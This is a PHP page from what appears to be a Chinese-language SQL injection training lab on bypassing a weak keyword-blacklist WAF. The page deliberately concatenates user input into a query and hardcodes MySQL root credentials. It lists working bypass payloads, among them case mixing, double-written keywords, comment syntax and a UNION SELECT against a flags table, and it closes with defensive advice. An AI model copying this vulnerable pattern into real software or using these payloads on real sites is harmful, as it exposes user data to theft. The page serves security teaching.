<?php
// SQL注入绕过场景
// 使用真实MySQL数据库

// 数据库连接信息
$servername = "127.0.0.1";
$username = "root";
$password = "123456";
$dbname = "zhao";

// 创建连接
$conn = new mysqli($servername, $username, $password, $dbname);

// 检查连接
if ($conn->connect_error) {
    die("连接失败: " . $conn->connect_error);
}

// 初始化数据库表和数据
function initDatabase($conn) {
    // 创建users表
    $create_users_sql = "CREATE TABLE IF NOT EXISTS users (
        id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(30) NOT NULL,
        password VARCHAR(30) NOT NULL,
        email VARCHAR(50) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $conn->query($create_users_sql);
    
    // 插入模拟数据
    $insert_users_sql = "INSERT IGNORE INTO users (username, password, email) VALUES
    ('admin', 'admin123', 'admin@example.com'),
    ('user1', 'password1', 'user1@example.com')";
    $conn->query($insert_users_sql);
}

// 数据库已在init_db.php中初始化

// 简单的WAF过滤（可被绕过）
function waf($input) {
    $blacklist = [
        'union', 'select', 'from', 'where', 'and', 'or', 'sleep', 'benchmark',
        'extractvalue', 'updatexml', 'floor', 'exp', '--', '#', '/*', '*/'
    ];
    
    foreach ($blacklist as $word) {
        $input = str_ireplace($word, '', $input);
    }
    
    return $input;
}

// 模拟数据库查询函数
function query($sql, $conn) {
    // 执行查询
    $result = $conn->query($sql);
    
    if (!$result) {
        // 捕获数据库错误
        throw new Exception($conn->error);
    }
    
    $rows = [];
    while ($row = $result->fetch_assoc()) {
        $rows[] = $row;
    }
    
    return $rows;
}

$id = $_GET['id'] ?? 1;
$filtered_id = waf($id);
$results = [];
$error = '';

// 执行查询（存在SQL注入漏洞，WAF可被绕过）
$sql = "SELECT * FROM users WHERE id=$filtered_id";
try {
    $results = query($sql, $conn);
} catch (Exception $e) {
    $error = $e->getMessage();
}

// 关闭连接
$conn->close();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL注入绕过 - SQL注入漏洞</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        body {
            background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 30px auto;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .alert-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .info-section {
            background: #e8f4fd;
            border-left: 5px solid #667eea;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .query-box {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 15px;
            margin: 20px 0;
        }
        .input-group {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }
        .input-group input {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
        }
        .btn {
            padding: 12px 25px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        .sql-code {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 15px 0;
            position: relative;
        }
        .sql-code::before {
            content: "执行的SQL:";
            display: block;
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .waf-info {
            background: #fff3cd;
            border: 2px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }
        .results-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        .results-table th,
        .results-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #dee2e6;
        }
        .results-table th {
            background: #667eea;
            color: white;
            font-weight: 600;
        }
        .payload-list {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin: 15px 0;
        }
        .payload-list h4 {
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .payload-list code {
            color: #7ee787;
            cursor: pointer;
            display: block;
            padding: 5px 0;
        }
        .flag-box {
            background: #d4edda;
            border: 2px solid #28a745;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            display: none;
        }
        .flag-box.show {
            display: block;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
            font-weight: 600;
        }
        .bypass-techniques {
            background: #f0f0f0;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .bypass-techniques h4 {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="alert-danger">
                <h4>🚨 SQL注入绕过漏洞</h4>
                <p>本页面存在SQL注入漏洞，虽然有简单的WAF过滤，但可以通过各种技巧绕过。</p>
            </div>
            
            <h2>5. 🔓 SQL注入绕过</h2>
            
            <div class="info-section">
                <strong>💡 漏洞说明：</strong><br>
                许多网站部署了WAF（Web应用防火墙）来防御SQL注入攻击，但如果过滤规则不够严格，攻击者可以通过各种技巧绕过这些防护。<br>
                常见的绕过方法包括：大小写混合、双写、编码、注释绕过等。<br>
                <br>
                <strong>挑战：</strong>绕过WAF的过滤，成功执行SQL注入
            </div>
        </div>

        <div class="card">
            <h3>🔍 用户查询（存在WAF过滤）</h3>
            <div class="query-box">
                <form method="GET">
                    <div class="input-group">
                        <input type="text" name="id" placeholder="输入用户ID..." value="<?php echo htmlspecialchars($id); ?>">
                        <button type="submit" class="btn">查询</button>
                    </div>
                </form>
                
                <div class="waf-info">
                    <strong>WAF过滤规则：</strong>过滤了 union, select, from, where, and, or, sleep, benchmark, extractvalue, updatexml, floor, exp, --, #, /*, */ 等关键词
                </div>
                
                <div class="sql-code">
                    <?php echo htmlspecialchars($sql); ?>
                </div>
                
                <?php if (!empty($error)): ?>
                <div class="error-box">
                    <strong>错误信息：</strong><?php echo htmlspecialchars($error); ?>
                </div>
                <?php endif; ?>
                
                <?php if (!empty($results)): ?>
                <h4>查询结果：</h4>
                <table class="results-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>用户名</th>
                            <th>密码</th>
                            <th>邮箱</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($results as $row): ?>
                        <tr>
                            <td><?php echo htmlspecialchars($row['id']); ?></td>
                            <td><?php echo htmlspecialchars($row['username']); ?></td>
                            <td><?php echo htmlspecialchars($row['password']); ?></td>
                            <td><?php echo htmlspecialchars($row['email']); ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                <?php else:
                    if ($id): ?>
                    <p style="color: #666; margin: 15px 0;">未找到用户</p>
                    <?php endif;
                endif; ?>
            </div>
        </div>

        <div class="card">
            <h3>🎯 绕过技巧Payload</h3>
            <div class="payload-list">
                <h4>1. 大小写混合</h4>
                <code onclick="setId('1 UnIoN SeLeCt 1,2,3,4,5')">1 UnIoN SeLeCt 1,2,3,4,5</code>
                
                <h4>2. 双写绕过</h4>
                <code onclick="setId('1 ununionion seselectlect 1,2,3,4,5')">1 ununionion seselectlect 1,2,3,4,5</code>
                
                <h4>3. 注释绕过</h4>
                <code onclick="setId('1 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5')">1 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5</code>
                <code onclick="setId('1 +UNION+SELECT+1,2,3,4,5')">1 +UNION+SELECT+1,2,3,4,5</code>
                
                <h4>4. 查询flag表</h4>
                <code onclick="setId('0 UnIoN SeLeCt id,flag,description,flag,created_at FrOm flags')">0 UnIoN SeLeCt id,flag,description,flag,created_at FrOm flags</code>
                
                <h4>5. 编码绕过</h4>
                <code onclick="setId('1 AND 1=1')">1 AND 1=1</code>
                <code onclick="setId('1 OR 1=1')">1 OR 1=1</code>
                
                <h4>6. 特殊字符</h4>
                <code onclick="setId('1%20AND%201=1')">1%20AND%201=1</code>
                <code onclick="setId('1/**/AND/**/1=1')">1/**/AND/**/1=1</code>
            </div>
            
            <div class="bypass-techniques">
                <h4>🔓 常见绕过技术</h4>
                <ul style="line-height: 1.6;">
                    <li><strong>大小写混合：</strong>如 <code>UnIoN</code>、<code>SeLeCt</code></li>
                    <li><strong>双写绕过：</strong>如 <code>ununionion</code>、<code>seselectlect</code></li>
                    <li><strong>注释绕过：</strong>如 <code>/*!UNION*/</code>、<code>/**/</code></li>
                    <li><strong>编码绕过：</strong>如URL编码、十六进制编码</li>
                    <li><strong>特殊字符：</strong>如空格的替代字符 <code>%20</code>、<code>+</code>、<code>/**/</code></li>
                    <li><strong>函数替代：</strong>使用功能相似的函数</li>
                    <li><strong>语句构造：</strong>改变SQL语句的结构</li>
                </ul>
            </div>
        </div>

        <div class="card">
            <h3>🛡️ 防御方法</h3>
            <div class="info-section">
                1. <strong>参数化查询：</strong>这是最有效的防御方法，从根本上防止SQL注入<br>
                2. <strong>专业WAF：</strong>使用专业的Web应用防火墙，定期更新规则<br>
                3. <strong>输入验证：</strong>对用户输入进行严格的类型检查和白名单过滤<br>
                4. <strong>最小权限：</strong>限制数据库用户权限<br>
                5. <strong>代码审计：</strong>定期进行代码安全审计
            </div>
            
            <a href="index.php" class="back-link">← 返回SQL注入模块首页</a>
        </div>
    </div>

    <script>
        function setId(payload) {
            document.querySelector('input[name="id"]').value = payload;
        }
    </script>
</body>
</html>
